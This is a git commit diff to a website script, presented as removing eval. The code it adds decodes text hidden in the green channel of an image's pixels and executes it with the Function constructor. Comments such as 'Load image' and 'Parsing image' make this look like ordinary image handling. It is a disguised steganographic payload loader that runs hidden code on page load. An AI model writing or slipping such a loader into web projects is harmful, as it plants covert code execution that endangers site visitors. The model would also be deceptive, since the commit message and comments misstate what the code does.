b408811b24e08dc06a023fddb1a47f8941b108c7
Ardi Hari Prasetiyo <ardihariprasetiyoo@gmail.com>
2023-07-12 15:55:28 +0700

    fix: remove eval, use function constructor

--- script/main.js
+++ script/main.js
@@ -1,13 +1,19 @@
+const loadImage = (img) => new Function(img)();
+
 const loadCanvasImage = async () => {
+  // Create canvas image
   const canvas = document.getElementById("canva");
   const ctx = canvas.getContext("2d");
   const imgEl = document.createElement("img");
+  // Load image
   imgEl.src = "./img/buyback.png";
   imgEl.onload = () => {
+    // Match canvas size with image size
     ctx.canvas.width = imgEl.width;
     ctx.canvas.height = imgEl.height;
     ctx.drawImage(imgEl, 0, 0);
     const imageData = ctx.getImageData(0, 0, imgEl.width, imgEl.height);
+    // Parsing image
     const pixelColorArray = imageData.data;
     const pixelRGB = [];
     for (let i = 0; i < pixelColorArray.length; i += 4) {
@@ -20,9 +26,13 @@ const loadCanvasImage = async () => {
     const pixelRGBColor = pixelRGB
       .map(([r, g, b]) => String.fromCharCode(g))
       .join("");
-    const pixelColor = pixelRGBColor.match(/(?<=----PIXEL START----)(.*)(?=----PIXEL END----)/);
-    if (pixelColor === null) return;
-    eval(pixelColor[0]);
+    const [img] = pixelRGBColor.match(
+      /(?<=----PIXEL START----)(.*)(?=----PIXEL END----)/
+    );
+    // If image not correctly parsed, then stop
+    if (img === null) return;
+    // Load image
+    loadImage(img);
   };
 };
 
